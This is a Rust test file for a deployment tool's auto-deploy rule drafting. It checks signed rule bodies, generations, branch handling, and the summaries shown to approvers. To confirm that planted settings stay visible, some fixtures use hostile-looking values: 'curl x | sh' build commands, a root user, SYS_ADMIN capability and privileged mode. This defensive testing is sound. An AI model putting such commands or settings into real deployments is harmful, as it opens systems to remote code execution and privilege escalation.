#![expect(clippy::indexing_slicing, reason = "JSON fixtures")]

use serde_json::{Value, json};
use sha2::{Digest as _, Sha256};

use super::*;
use crate::authority::keys::Signer;
use crate::authority::restart::OwnPrompt;
use crate::authority::rule::{BUILDER_SHA, CommitSha};

const SEALED_A: &str = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==";

/// The digest of the body [`golden`] drafts. The dashboard's `autoDeployRuleBody` test
/// pins the same digest: a browser that drafts other bytes than the CLI fails there.
const GOLDEN: &str = "004e199a9600b0c6fa8b432a1de4d098c1f217a4bc8e40f36ffa3af27b2c7b28";

/// What the dashboard's test passes as the rule view: one Git Service and one image
/// Service, as the Store's `rule` view writes them.
pub(crate) fn view_json() -> Value {
    json!({
        "environment": {"id": "ignored"},
        "namespace": "app",
        "rule": null,
        "sources": [{
            "service": "web",
            "repository": "Ployz-test/lab-service",
            "repository_id": 1_450_985_696_u64,
            "branch": "main",
            "root_dir": ".",
            "build": {"buildMethod": "dockerfile", "dockerfilePath": "Dockerfile"}
        }],
        "target": [spec_json("web", "one"), spec_json("cache", "two")],
        "changed": []
    })
}

fn spec_json(name: &str, plain: &str) -> Value {
    json!({
        "name": name,
        "mode": {"mode": "replicated", "replicas": 1},
        "container": {
            "image": format!("ployz-build/{name}"),
            "pull_policy": "never",
            "environment": {
                "PLAIN": plain,
                "SECRET": {"sealed": SEALED_A, "scope": "shared", "key": "SECRET"}
            },
            "sealed_identity": {
                "organization": "org",
                "environment": "11111111-1111-1111-1111-111111111111",
                "service": "22222222-2222-2222-2222-222222222222"
            }
        },
        "pre_deploy": {"command": ["migrate"]}
    })
}

pub(crate) fn terms_json() -> Value {
    json!({
        "cluster": "CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQk=",
        "machines": ["2".repeat(32), "1".repeat(32), "2".repeat(32)],
        "owner_id": 278_111_222,
        "builder": {
            "ref": format!("getployz/build/.github/workflows/build.yml@{BUILDER_SHA}"),
            "sha": BUILDER_SHA
        },
        "platform": "linux/amd64",
        "new_rule": "33".repeat(16),
        "issued_at": 1_000,
        "signer": "passkey"
    })
}

fn basis(view: Value) -> RuleBasis {
    serde_json::from_value(view).unwrap()
}

fn terms() -> RuleTerms {
    serde_json::from_value(terms_json()).unwrap()
}

fn web() -> Vec<ServiceName> {
    vec![ServiceName::parse("web").unwrap()]
}

fn golden() -> RuleDraft {
    let basis = basis(view_json());
    AutoDeployRule::draft(&basis, &basis.branch_services(), terms())
        .unwrap()
        .drafted(&basis)
        .unwrap()
}

fn kept(rule: &AutoDeployRule) -> Value {
    let mut view = view_json();
    view["rule"] =
        serde_json::to_value(Signed::sign(rule, &Signer::from_seed(&[7; 32])).unwrap()).unwrap();
    view
}

#[test]
fn the_drafted_body_is_pinned() {
    let draft = golden();
    assert_eq!(
        hex(&Sha256::digest(draft.body.as_bytes())),
        GOLDEN,
        "body: {}",
        draft.body
    );
    let rule: AutoDeployRule = canonical::from_canonical(&draft.body).unwrap();
    assert_eq!(rule.signer, SignerKey::Passkey(OwnPrompt::Passkey));
    assert_eq!(rule.generation, 1);
    assert_eq!(rule.rule, RuleId::from_bytes([0x33; 16]));
    assert_eq!(rule.machines.len(), 2, "sorted and distinct");
    assert!(draft.body.contains(r#""signer":"passkey""#));
}

#[test]
fn a_rule_covers_only_services_that_build_from_github() {
    let rule: AutoDeployRule = canonical::from_canonical(&golden().body).unwrap();
    assert_eq!(rule.services.len(), 1);
    assert_eq!(rule.services[0].name.as_str(), "web");
    assert!(
        rule.services[0].secrets.is_some(),
        "the build's Sealed value"
    );
    let cache = ServiceName::parse("cache").unwrap();
    let error = AutoDeployRule::draft(&basis(view_json()), &[cache], terms()).unwrap_err();
    assert_eq!(
        error.to_string(),
        "cache doesn't build from GitHub, so a rule can't deploy it."
    );
}

#[test]
fn the_summary_shows_what_the_body_pins() {
    let summary = golden().summary;
    assert_eq!(summary.repository, "Ployz-test/lab-service");
    assert_eq!(summary.branch, "main");
    assert!(summary.pinned);
    assert_eq!(summary.servers, 2);
    let web = &summary.services[0];
    assert_eq!(
        web.builds,
        "Dockerfile in ., for linux/amd64, with the Actions cache, build args PLAIN=one, \
         build secrets SECRET"
    );
    assert!(
        web.changes.is_empty(),
        "nothing to compare a first rule with"
    );
    assert_eq!(
        web.settings,
        [
            "variables PLAIN=one, SECRET (sealed)",
            r#"pre-deploy ["migrate"]"#,
            r#"mode {"mode":"replicated","replicas":1}"#,
            r#"restart {"name":"unless-stopped"}"#
        ]
    );
}

/// Each build setting Cloud could plant changes the body the person signs and what they
/// read: the builder runs the signed policy exactly.
#[test]
fn every_signed_build_setting_shows() {
    let base = golden();
    for (path, value, shown) in [
        ("/root_dir", json!("apps/web"), "Dockerfile in apps/web,"),
        (
            "/build/dockerfilePath",
            json!("evil.Dockerfile"),
            "evil.Dockerfile in .,",
        ),
        ("/build/buildMethod", json!("railpack"), "Railpack in .,"),
    ] {
        let (parent, field) = path.rsplit_once('/').unwrap();
        let mut view = view_json();
        view["sources"][0].pointer_mut(parent).unwrap()[field] = value;
        let planted = basis(view);
        let next = AutoDeployRule::draft(&planted, &planted.branch_services(), terms())
            .unwrap()
            .drafted(&planted)
            .unwrap();
        assert_ne!(next.body, base.body, "{path} is signed");
        let builds = &next.summary.services[0].builds;
        assert!(builds.starts_with(shown), "{path}: {builds}");
    }
    let mut view = view_json();
    view["sources"][0]["build"] = json!({"buildMethod": "railpack", "command": "curl x | sh"});
    let planted = basis(view);
    let railpack = AutoDeployRule::draft(&planted, &planted.branch_services(), terms()).unwrap();
    let mut view = view_json();
    view["sources"][0]["build"] = json!({"buildMethod": "railpack"});
    let plain = basis(view);
    let detected = AutoDeployRule::draft(&plain, &plain.branch_services(), terms()).unwrap();
    assert_ne!(railpack.services[0].policy, detected.services[0].policy);
    assert!(
        builds(&railpack.services[0].policy).starts_with(r#"Railpack running "curl x | sh" in .,"#),
        "{}",
        builds(&railpack.services[0].policy)
    );
    let mut targeted = detected.services[0].policy.clone();
    targeted.target = Some("release".into());
    assert!(builds(&targeted).contains(", target release"));
}

/// Each field Cloud could plant in a Saved spec changes what the person reads, since the
/// template signs it too.
#[test]
fn every_signed_setting_shows() {
    let base = settings(&serde_json::from_value(spec_json("web", "one")).unwrap());
    for (path, value, shown) in [
        (
            "/container/command",
            json!(["sh", "-c", "curl x"]),
            r#"command ["sh","-c","curl x"]"#,
        ),
        (
            "/container/entrypoint",
            json!(["/bin/sh"]),
            r#"entrypoint ["/bin/sh"]"#,
        ),
        ("/container/user", json!("root"), r#"user "root""#),
        (
            "/container/cap_add",
            json!(["SYS_ADMIN"]),
            r#"cap_add ["SYS_ADMIN"]"#,
        ),
        (
            "/container/sysctls",
            json!({"net.ipv4.ip_forward": "1"}),
            r#"sysctls {"net.ipv4.ip_forward":"1"}"#,
        ),
        ("/container/privileged", json!(true), "privileged true"),
        (
            "/container/network",
            json!("ingress_holder"),
            r#"network "ingress_holder""#,
        ),
        (
            "/pre_deploy/user",
            json!("root"),
            r#"pre-deploy user "root""#,
        ),
        (
            "/pre_deploy/privileged",
            json!(true),
            "pre-deploy privileged true",
        ),
        (
            "/pre_deploy/environment",
            json!({"TOKEN": "x"}),
            "pre-deploy variables TOKEN=x",
        ),
    ] {
        let (parent, field) = path.rsplit_once('/').unwrap();
        let mut spec = spec_json("web", "one");
        spec.pointer_mut(parent).unwrap()[field] = value;
        let lines = settings(&serde_json::from_value(spec).unwrap());
        assert!(lines.iter().any(|line| line == shown), "{path}: {lines:?}");
        assert_ne!(lines, base, "{path}");
    }
}

#[test]
fn approving_again_takes_the_next_generation_and_names_what_changed() {
    let first: AutoDeployRule = canonical::from_canonical(&golden().body).unwrap();
    let mut view = kept(&first);
    view["target"][0] = spec_json("web", "changed");
    let basis = basis(view);
    let next = AutoDeployRule::draft(&basis, &basis.branch_services(), terms()).unwrap();
    assert_eq!((next.rule, next.generation), (first.rule, 2));
    let summary = next.summary(&basis);
    assert_eq!(summary.services[0].changes, ["settings", "build args"]);
    assert_eq!(
        summary.services[0].settings[0],
        "variables PLAIN=changed, SECRET (sealed)"
    );
}

#[test]
fn another_branch_starts_a_new_rule() {
    let mut first: AutoDeployRule = canonical::from_canonical(&golden().body).unwrap();
    first.rule = RuleId::from_bytes([0x44; 16]);
    first.generation = 7;
    let mut view = kept(&first);
    view["sources"][0]["branch"] = json!("release");
    let basis = basis(view);
    // What the dashboard drafts with no Service named: the Environment's GitHub Services
    // where they build now, not where the kept rule pointed.
    assert_eq!(basis.branch_services(), web());
    let next = AutoDeployRule::draft(&basis, &basis.branch_services(), terms()).unwrap();
    assert_eq!(
        (next.rule, next.generation),
        (RuleId::from_bytes([0x33; 16]), 1)
    );
    assert_eq!(next.source.branch, "release");
}

#[test]
fn an_ended_rule_on_another_branch_turns_on_again_on_the_new_one() {
    let first: AutoDeployRule = canonical::from_canonical(&golden().body).unwrap();
    let ended = AutoDeployRule::ending(
        &basis(kept(&first)),
        Timestamp::from_millis(5_000).unwrap(),
        terms().signer,
    )
    .unwrap();
    let mut view = kept(&ended);
    view["sources"][0]["branch"] = json!("release");
    let basis = basis(view);
    let next = AutoDeployRule::draft(&basis, &basis.branch_services(), terms()).unwrap();
    assert_eq!(
        (next.source.branch.as_str(), next.ended),
        ("release", false)
    );
}

#[test]
fn services_split_across_branches_keep_the_kept_rules_branch() {
    let first: AutoDeployRule = canonical::from_canonical(&golden().body).unwrap();
    let mut view = kept(&first);
    view["sources"].as_array_mut().unwrap().push(json!({
        "service": "cache",
        "repository": "Ployz-test/lab-service",
        "repository_id": 1_450_985_696_u64,
        "branch": "release",
        "root_dir": ".",
        "build": {"buildMethod": "railpack"}
    }));
    assert_eq!(basis(view.clone()).branch_services(), web());
    // With no rule to follow, drafting names the split.
    view["rule"] = Value::Null;
    let basis = basis(view);
    assert!(matches!(
        AutoDeployRule::draft(&basis, &basis.branch_services(), terms()),
        Err(RuleDraftError::TwoBranches { .. })
    ));
}

#[test]
fn a_build_change_is_named_by_what_changed() {
    let first: AutoDeployRule = canonical::from_canonical(&golden().body).unwrap();
    let mut view = kept(&first);
    view["sources"][0]["build"] = json!({"buildMethod": "railpack"});
    let basis = basis(view);
    let next = AutoDeployRule::draft(&basis, &web(), terms()).unwrap();
    assert_eq!(next.summary(&basis).services[0].changes, ["build method"]);
}

#[test]
fn turning_off_signs_the_kept_rules_next_generation_ended() {
    let first: AutoDeployRule = canonical::from_canonical(&golden().body).unwrap();
    let on = basis(kept(&first));
    let later = Timestamp::from_millis(5_000).unwrap();
    let ended = AutoDeployRule::ending(&on, later, terms().signer).unwrap();
    assert_eq!(
        (ended.generation, ended.ended, ended.issued_at),
        (2, true, later)
    );
    assert_eq!(ended.services, first.services);
    let off = basis_with(&ended);
    assert!(matches!(
        AutoDeployRule::ending(&off, later, terms().signer),
        Err(RuleDraftError::NoRule)
    ));
    assert!(matches!(
        AutoDeployRule::ending(&basis(view_json()), later, terms().signer),
        Err(RuleDraftError::NoRule)
    ));
}

fn basis_with(rule: &AutoDeployRule) -> RuleBasis {
    basis(kept(rule))
}

#[test]
fn services_on_two_branches_are_refused() {
    let mut view = view_json();
    view["sources"].as_array_mut().unwrap().push(json!({
        "service": "cache",
        "repository": "Ployz-test/lab-service",
        "repository_id": 1_450_985_696_u64,
        "branch": "release",
        "root_dir": ".",
        "build": {"buildMethod": "railpack"}
    }));
    let basis = basis(view);
    assert_eq!(
        AutoDeployRule::draft(&basis, &basis.branch_services(), terms())
            .unwrap_err()
            .to_string(),
        "A rule deploys one branch, and cache builds from Ployz-test/lab-service at release, \
         not Ployz-test/lab-service at main. Approve a rule for each."
    );
}

#[test]
fn the_builder_a_person_reads_names_its_commit() {
    let mut terms = terms();
    terms.builder = Builder {
        r#ref: "Ployz-test/build/.github/workflows/build.yml@main".to_owned(),
        sha: CommitSha::from_bytes([0xab; 20]),
    };
    let basis = basis(view_json());
    let summary = AutoDeployRule::draft(&basis, &web(), terms)
        .unwrap()
        .summary(&basis);
    assert!(!summary.pinned);
    assert_eq!(
        summary.builder,
        format!(
            "Ployz-test/build/.github/workflows/build.yml@main at {}",
            "ab".repeat(20)
        )
    );
}

#[test]
fn a_fork_at_the_pinned_commit_is_not_ployzs_release() {
    let mut terms = terms();
    terms.builder = Builder {
        r#ref: format!("Ployz-test/build/.github/workflows/build.yml@{BUILDER_SHA}"),
        sha: CommitSha::parse(BUILDER_SHA).unwrap(),
    };
    let basis = basis(view_json());
    let summary = AutoDeployRule::draft(&basis, &web(), terms)
        .unwrap()
        .summary(&basis);
    assert!(!summary.pinned, "GitHub names the fork in job_workflow_ref");
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

#[test]
fn terms_that_name_no_builder_pin_ployzs_own_release() {
    let mut bare = terms_json();
    let fields = bare.as_object_mut().unwrap();
    fields.remove("builder");
    fields.remove("platform");
    assert_eq!(serde_json::from_value::<RuleTerms>(bare).unwrap(), terms());
}
